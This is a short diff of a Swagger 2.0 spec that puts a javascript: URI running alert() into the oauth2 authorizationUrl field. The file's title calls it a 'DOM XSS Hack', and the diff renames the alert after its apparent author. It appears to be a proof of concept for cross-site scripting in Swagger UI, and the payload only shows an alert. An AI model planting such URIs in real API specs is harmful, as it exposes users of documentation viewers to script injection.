@@ -2,7 +2,7 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:alert("xss")//
+    authorizationUrl: javascript:alert("XSS Hack alert by Drocapy")//
 info:
   version: "1.0.0"
   title: DOM XSS Hack Image & Javascript Code by Drocapy
